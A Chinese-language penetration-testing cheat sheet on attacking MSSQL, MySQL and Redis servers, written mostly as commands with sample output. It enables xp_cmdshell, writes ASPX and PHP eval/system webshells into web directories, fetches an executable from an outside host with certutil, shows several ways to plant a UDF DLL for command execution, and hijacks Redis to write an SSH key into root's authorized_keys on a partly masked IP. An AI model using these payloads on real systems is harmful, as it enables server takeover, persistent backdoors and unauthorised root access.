## 数据库安全基础

### MSSQL

##### 数据库角色权限

```
sysadmin:执行SQL Server中的任何动作

db_owner:可以执行数据库中技术所有动作的用户

public:数据库的每个合法用户都属于该角色。它为数据库中的用户提供了所有默认权限。
```

##### 数据库身份验证

```
SQL Server中的验证方式
Windows身份验证模式
SQL Server和Windows身份验证模式（混合模式）
```

##### 常用命令

- xp_cmdshell 执行命令

```
exec xp_cmdshell 'dir'
```

- sp_configure 开启扩展

```
exec sp_configure 'show'
exec sp_configure 'show advanced options',1
reconfigure
go
exec sp_configure 'xp_cmdshell',1
reconfigure
go
```

- 文件上传
```
1、通过SQL搜索指定文件

1> exec xp_cmdshell 'dir /s C:\ /b | findstr "Files.aspx"';
2> go
+-------------------+
| output            |
+-------------------+
| C:\web\Files.aspx |
| NULL              |
+-------------------+
(2 rows affected)

2、通过SQL写webshell到网站目录，DOS转义问题

1> exec xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["z"],"unsafe");%^> >> C:\web\hello.aspx';
2> go
+--------+
| output |
+--------+
| NULL   |
+--------+
(1 rows affected)


3、文件下载

# 本地开启Web服务
python -m SimpleHTTPServer 80   
# 远程服务器执行下载
1> exec xp_cmdshell "certutil -urlcache -f -split http://172.18.0.24/3389.exe";
2> go
+------------------------------------+
| output                             |
+------------------------------------+
| ****  联机  ****                   |
|   000000  ...                      |
|   02c8fe                           |
| CertUtil: -URLCache 命令成功完成。 |
| NULL                               |
+------------------------------------+
(5 rows affected)

```

- 加解密web.config
```
aspnet_regiis -pef "加密的字段" "web路径不带\"
aspnet_regiis -pdf "解密的字段" "web路径不带\"
```


### MySQL

##### 获取Shell

获取方法有两种

- 上传一个用户自定义方法udf，执行系统命令
- mysql+web的形式，into outfile写文件

**常用语句**

```
# 显示用户名
select user();            
# 显示数据库版本
select @@version;
# 显示导出目录路径
select @@secure_file_priv;
# 将数据导出到某个文件
select 1 into outfile '/var/www/html/sql/1.txt';
select "<?=system($_GET['z']);?>" into outfile '/var/www/html/sql/z.php'
select "<?=eval($_REQUEST['z']);?>" into outfile '/var/www/html/sql/z1.php'
```

导出UDF.DLL

```
# 1、MySQL5 新建plugin目录
select @@basedir; //查找到mysql的目录 

select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'; //利用NTFS ADS创建lib目录 

select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录 

# 2、利用网络共享导出UDF

select load_file('\\\\192.168.0.19\\share\\udf.dll') into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";

# 3、十六进制导出

// 转换为hex函数
select hex(load_file('D:\\udf.dll')) into dumpfile "D:\\udf.hex";
// 导入
select 0x4d5a...... into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";

# 4、创建一个表并将二进制数据插入到十六进制编码流中，其中的二进制数据用update语句来连接。

create table temp(data longblob); 
insert into temp(data) values (0x4d5a9....); 
update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000); 

select data from temp into dump file "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"; 

# 5、使用MySQL 5.6.1和MariaDB 10.0.5中介绍的函数“to_base64”和“from_base64”上传二进制文件。

# 转换为base64
select to_base64(load_file('D:\\udf.dll'));

# base64导出为DLL
select from_base64("Base64编码") into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"；
```




##### 条件

1、into outfile需要MySQL的file权限

2、MySQL5.7以后，secure_file_priv只能通过mysqld.cnf配置文件编辑。默认不配置，outfile写文件无权限。

3、读写文件时候，文件操作的用户是mysql:mysql，所以需要MySQL具有一个可写入的目录权限。



### Redis

**漏洞测试**
```
1）本地生成秘钥

root@GanDolf:~# ssh-keygen  -t rsa

2）将公钥写入一个文件

root@GanDolf:~# cd /root/.ssh/

root@GanDolf:~/.ssh# (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt

3）连接redis写入文件

root@GanDolf:~/.ssh# cat foo.txt | redis-cli -h 210.73.90.xxx -x set crackit

OK
root@GanDolf:~/.ssh# redis-cli  -h 210.73.90.xxx

210.73.90.xxx:6379> config set dir /root/.ssh/
OK
(1.39s)
210.73.90.xxx:6379> CONFIG GET dir
1) "dir"
2) "/root/.ssh"
210.73.90.xxx:6379> config set dbfilename "authorized_keys"
OK
(1.03s)
210.73.90.xxx:6379> SAVE
OK
210.73.90.xxx:6379> exit
root@GanDolf:~/.ssh# ssh

4）连接服务器
root@GanDolf:~/.ssh# ssh -i id_rsa root@210.73.90.xxx
```